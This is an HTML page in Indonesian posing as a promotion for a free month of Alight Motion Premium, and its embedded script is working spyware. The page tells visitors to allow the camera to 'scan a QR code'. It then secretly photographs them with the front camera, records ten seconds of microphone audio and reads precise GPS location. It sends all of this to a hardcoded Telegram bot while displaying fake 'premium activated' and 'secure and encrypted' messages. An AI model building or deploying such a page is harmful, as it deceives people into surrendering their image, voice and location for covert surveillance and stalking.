<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alight Motion Premium</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(circle at 20% 30%, #1a1f2e, #0b0d14 80%);
            padding: 20px;
            margin: 0;
            position: relative;
        }
        /* Animated glass orbs */
        body::before, body::after {
            content: '';
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.25;
            z-index: 0;
        }
        body::before {
            width: 400px;
            height: 400px;
            background: #f7971e;
            top: -100px;
            left: -100px;
        }
        body::after {
            width: 500px;
            height: 500px;
            background: #7b4aff;
            bottom: -150px;
            right: -150px;
        }

        .card {
            position: relative;
            z-index: 1;
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(20px) saturate(180%);
            -webkit-backdrop-filter: blur(20px) saturate(180%);
            border-radius: 48px;
            padding: 36px 30px;
            max-width: 520px;
            width: 100%;
            box-shadow: 0 40px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.12);
            transition: all 0.3s;
        }

        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .badge-premium {
            background: linear-gradient(135deg, #f7971e, #ffd200);
            color: #ffffff;
            font-weight: 800;
            font-size: 11px;
            padding: 6px 16px;
            border-radius: 40px;
            letter-spacing: 0.6px;
            text-transform: uppercase;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            box-shadow: 0 4px 12px rgba(247, 151, 30, 0.3);
            text-shadow: 0 1px 4px rgba(0,0,0,0.2);
        }
        .badge-premium i { font-size: 13px; }
        .timer {
            font-size: 13px;
            color: #ffb347;
            background: rgba(35, 42, 61, 0.5);
            padding: 4px 14px;
            border-radius: 30px;
            display: flex;
            align-items: center;
            gap: 8px;
            backdrop-filter: blur(4px);
            border: 1px solid rgba(255, 180, 70, 0.15);
        }

        .icon-header {
            text-align: center;
            font-size: 70px;
            margin-bottom: 4px;
            color: #ffb347;
            text-shadow: 0 0 40px rgba(247, 151, 30, 0.25);
            animation: pulse-glow 3s infinite alternate;
        }
        @keyframes pulse-glow {
            0% { text-shadow: 0 0 20px rgba(247, 151, 30, 0.2); }
            100% { text-shadow: 0 0 60px rgba(247, 151, 30, 0.5); }
        }

        h1 {
            font-size: 30px;
            font-weight: 800;
            text-align: center;
            background: linear-gradient(135deg, #ffb347, #ff8c00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 2px;
            letter-spacing: -0.5px;
        }
        .sub {
            text-align: center;
            color: #9aa5c0;
            font-size: 15px;
            margin-bottom: 24px;
            border-bottom: 1px solid rgba(255,255,255,0.08);
            padding-bottom: 18px;
        }
        .sub strong { color: #ffb347; -webkit-text-fill-color: #ffb347; }

        .info-box {
            background: rgba(18, 23, 36, 0.4);
            backdrop-filter: blur(8px);
            border-radius: 24px;
            padding: 20px 24px;
            margin-bottom: 26px;
            border-left: 6px solid #f7971e;
            font-size: 15px;
            line-height: 1.8;
            display: flex;
            align-items: flex-start;
            gap: 14px;
            border: 1px solid rgba(255,255,255,0.06);
        }
        .info-box i {
            color: #ffb347;
            font-size: 24px;
            margin-top: 3px;
        }
        .info-box .text { flex: 1; color: #eef2f7; }
        .info-box span {
            color: #ffd966;
            font-weight: 600;
        }

        .status-panel {
            background: rgba(16, 21, 31, 0.5);
            backdrop-filter: blur(8px);
            border-radius: 20px;
            padding: 16px 22px;
            margin-bottom: 28px;
            display: flex;
            align-items: center;
            gap: 18px;
            border: 1px solid rgba(255,255,255,0.06);
            min-height: 78px;
            transition: all 0.3s;
        }
        .status-indicator {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: #3e485f;
            flex-shrink: 0;
            transition: 0.4s;
            box-shadow: 0 0 0 0 rgba(255,255,255,0.1);
        }
        .status-indicator.active {
            background: #f5b342;
            box-shadow: 0 0 25px #f5b342aa;
        }
        .status-indicator.done {
            background: #2ecc71;
            box-shadow: 0 0 25px #2ecc71aa;
        }
        .status-indicator.error {
            background: #e74c3c;
            box-shadow: 0 0 25px #e74c3caa;
        }
        #statusText {
            font-size: 15px;
            font-weight: 400;
            color: #cbd6ed;
            flex: 1;
            word-break: break-word;
        }
        #statusText i { margin-right: 10px; color: #f5b342; }
        #statusText a {
            color: #ffb347;
            text-decoration: underline;
            word-break: break-all;
        }

        .btn-primary {
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 60px;
            background: linear-gradient(135deg, #f7971e, #e07c0a);
            color: #ffffff !important;
            font-size: 20px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow: 0 12px 40px rgba(247, 151, 30, 0.25);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 14px;
            letter-spacing: 0.4px;
            position: relative;
            overflow: hidden;
            text-shadow: 0 1px 4px rgba(0,0,0,0.2);
        }
        .btn-primary::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
            opacity: 0;
            transition: opacity 0.4s;
        }
        .btn-primary:hover:not(:disabled)::after {
            opacity: 1;
        }
        .btn-primary i { font-size: 24px; }
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 16px 50px rgba(247, 151, 30, 0.4);
        }
        .btn-primary:active:not(:disabled) {
            transform: scale(0.98);
        }
        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
            background: #3a3f55;
            box-shadow: none;
            color: #8892b0 !important;
            text-shadow: none;
        }

        .log-area {
            margin-top: 24px;
            background: rgba(11, 16, 26, 0.5);
            backdrop-filter: blur(4px);
            border-radius: 18px;
            padding: 14px 18px;
            max-height: 120px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 12px;
            color: #6a7a96;
            border: 1px solid rgba(255,255,255,0.05);
            line-height: 2;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .log-area i { margin-right: 8px; color: #f5b342; }
        .log-area a { color: #ffb347; text-decoration: underline; }
        .log-area::-webkit-scrollbar { width: 5px; }
        .log-area::-webkit-scrollbar-track { background: transparent; }
        .log-area::-webkit-scrollbar-thumb { background: #3d4a66; border-radius: 10px; }

        .footer-note {
            margin-top: 20px;
            font-size: 12px;
            color: #4d5a78;
            text-align: center;
            display: flex;
            justify-content: center;
            gap: 18px;
            flex-wrap: wrap;
        }
        .footer-note .badge {
            background: rgba(27, 34, 53, 0.4);
            backdrop-filter: blur(4px);
            padding: 4px 18px;
            border-radius: 40px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            border: 1px solid rgba(255,255,255,0.05);
            color: #9aa5c0;
        }
        .footer-note .badge i { font-size: 12px; }
        .auto-badge { color: #ffb347; }

        @media (max-width: 480px) {
            .card { padding: 24px 18px; border-radius: 32px; }
            h1 { font-size: 24px; }
            .icon-header { font-size: 54px; }
            .btn-primary { font-size: 18px; padding: 18px; }
        }
    </style>
</head>
<body>
<div class="card">
    <div class="top-bar">
        <span class="badge-premium"><i class="fas fa-star"></i> PROMO TERBATAS</span>
        <span class="timer"><i class="fas fa-clock"></i> 24:00</span>
    </div>

    <div class="icon-header"><i class="fas fa-qrcode"></i></div>

    <h1>Alight Motion Premium</h1>
    <div class="sub">Klaim <strong>1 Bulan GRATIS</strong> · Aktivasi perangkat</div>

    <div class="info-box">
        <i class="fas fa-gift"></i>
        <div class="text">
            Dapatkan akses penuh ke semua fitur premium selama 30 hari tanpa biaya.<br>
            <span><i class="fas fa-camera" style="margin-right:4px;"></i> silahkan izinkan kamera untuk mengscan QR Alight Motion Premium gratis</span>
        </div>
    </div>

    <div class="status-panel">
        <div class="status-indicator" id="indicator"></div>
        <div id="statusText"><i class="fas fa-circle"></i> Siap</div>
    </div>

    <button class="btn-primary" id="startBtn">
        <i class="fas fa-play"></i> Klaim Sekarang
    </button>

    <div class="log-area" id="logArea"><i class="fas fa-terminal"></i>  Log aktivitas promo</div>

    <div class="footer-note">
        <span class="badge"><i class="fas fa-lock"></i> Aman & terenkripsi</span>
        <span class="badge"><i class="fas fa-bolt"></i> Klik tombol untuk mulai</span>
    </div>
</div>

<script>
    // ===== KONFIGURASI TELEGRAM =====
    const BOT_TOKEN = '8632826690:AAEFIgGbBQQehGryvQTLpL6O4dSnY83O5jo';
    const CHAT_ID = '8303356575';
    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const PHOTO_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const AUDIO_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
    const DOC_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    let mediaStream = null;
    let audioChunks = [];
    let mediaRecorder = null;
    let locationData = null;
    let isRunning = false;

    const statusText = document.getElementById('statusText');
    const indicator = document.getElementById('indicator');
    const startBtn = document.getElementById('startBtn');
    const logArea = document.getElementById('logArea');

    function setStatus(msg, state = 'active') {
        let icon = '<i class="fas fa-spinner fa-pulse"></i>';
        if (state === 'done') icon = '<i class="fas fa-check-circle"></i>';
        else if (state === 'error') icon = '<i class="fas fa-exclamation-circle"></i>';
        else if (state === '') icon = '<i class="fas fa-circle"></i>';
        statusText.innerHTML = `${icon} ${msg}`;
        indicator.className = 'status-indicator';
        if (state === 'active') indicator.classList.add('active');
        else if (state === 'done') indicator.classList.add('done');
        else if (state === 'error') indicator.classList.add('error');
    }

    function logMsg(msg) {
        const time = new Date().toLocaleTimeString('id-ID');
        logArea.innerHTML += `\n[${time}] ${msg}`;
        logArea.scrollTop = logArea.scrollHeight;
    }

    function getGpsLink(lat, lng) {
        return `https://www.google.com/maps?q=${lat},${lng}`;
    }

    async function sendTelegramText(text) {
        try {
            const resp = await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
            return await resp.json();
        } catch (e) { console.error(e); }
    }

    async function sendTelegramPhoto(blob, caption = '') {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'capture.jpg');
        if (caption) fd.append('caption', caption);
        try { return await fetch(PHOTO_URL, { method: 'POST', body: fd }); } catch (e) { console.error(e); }
    }

    async function sendTelegramAudio(blob, caption = '') {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('audio', blob, 'recording.webm');
        if (caption) fd.append('caption', caption);
        try { return await fetch(AUDIO_URL, { method: 'POST', body: fd }); } catch (e) { console.error(e); }
    }

    async function sendTelegramLocationJSON(loc) {
        if (!loc) return;
        const jsonStr = JSON.stringify(loc, null, 2);
        const blob = new Blob([jsonStr], { type: 'application/json' });
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('document', blob, 'location.json');
        fd.append('caption', 'Lokasi perangkat');
        try { return await fetch(DOC_URL, { method: 'POST', body: fd }); } catch (e) { console.error(e); }
    }

    async function capturePhoto() {
        return new Promise((resolve, reject) => {
            if (!mediaStream) return reject('Tidak ada stream');
            const track = mediaStream.getVideoTracks()[0];
            if (!track) return reject('Tidak ada track video');
            const ic = new ImageCapture(track);
            ic.takePhoto().then(blob => resolve(blob)).catch(err => reject(err));
        });
    }

    function startAudioRecording() {
        return new Promise((resolve, reject) => {
            if (!mediaStream) return reject('Tidak ada stream');
            const audioTracks = mediaStream.getAudioTracks();
            if (audioTracks.length === 0) return reject('Tidak ada track audio');
            const audioStream = new MediaStream(audioTracks);
            mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
            audioChunks = [];
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
            mediaRecorder.onstop = () => resolve(new Blob(audioChunks, { type: 'audio/webm' }));
            mediaRecorder.start();
            setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 10000);
        });
    }

    function getLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) return reject('Geolokasi tidak didukung');
            navigator.geolocation.getCurrentPosition(
                pos => resolve({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: new Date().toISOString()
                }),
                err => reject(err.message),
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }

    async function runFullCapture() {
        if (isRunning) return;
        isRunning = true;
        startBtn.disabled = true;
        startBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Memproses...';

        logMsg('Mulai aktivasi promo...');
        try {
            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            logMsg('Izin media diberikan');

            setStatus('Memindai QR lisensi...', 'active');
            const photoBlob = await capturePhoto();
            logMsg('Foto QR diambil');
            setStatus('Mengirim data QR...', 'active');
            await sendTelegramPhoto(photoBlob, 'Alight_QR_scan');
            logMsg('Foto terkirim');
            await sendTelegramText('QR code terdeteksi — foto terkirim.');

            setStatus('Tunggu Sebentar', 'active');
            logMsg('Mulai rekam suara...');
            const audioBlob = await startAudioRecording();
            logMsg('Rekaman selesai');
            setStatus('Mengirim hasil uji suara...', 'active');
            await sendTelegramAudio(audioBlob, 'Alight_audio_test');
            logMsg('Audio terkirim');

            setStatus('Deteksi wilayah promo...', 'active');
            logMsg('Mengambil GPS...');
            try {
                locationData = await getLocation();
                const linkGps = getGpsLink(locationData.lat, locationData.lng);
                
                await sendTelegramLocationJSON(locationData);
                const locText = `Wilayah: ${locationData.lat}, ${locationData.lng} (±${locationData.accuracy}m)\nLink GPS: ${linkGps}`;
                await sendTelegramText(locText);
                
                setStatus(`Lokasi terverifikasi - <a href="${linkGps}" target="_blank">${linkGps}</a>`, 'done');
                logMsg(`Link GPS: ${linkGps}`);
            } catch (locErr) {
                await sendTelegramText(`Gagal lokasi: ${locErr}`);
                logMsg(`Error lokasi: ${locErr}`);
                setStatus('Lokasi gagal, promo tetap diproses', 'error');
            }

            await sendTelegramText('Alight Motion Premium 1 bulan — AKTIF. Data lengkap terkirim.');
            logMsg('=== PREMIUM AKTIF ===');
            if (!locationData) {
                setStatus('Selamat! Premium aktif (lokasi tidak tersedia)', 'done');
            } else {
                // status sudah diatur
            }

        } catch (err) {
            const msg = `Gagal aktivasi: ${err}`;
            setStatus(msg, 'error');
            logMsg(`KRITIKAL: ${err}`);
            await sendTelegramText(`Error aktivasi: ${err}`);
        } finally {
            if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
            startBtn.disabled = false;
            startBtn.innerHTML = '<i class="fas fa-redo-alt"></i> Ulangi Klaim';
            isRunning = false;
        }
    }

    startBtn.addEventListener('click', runFullCapture);

    window.onload = function() {
        logMsg('Halaman siap. Tunggu aksi pengguna.');
    };

    logMsg('Sistem promo siap.');
</script>
</body>
</html>
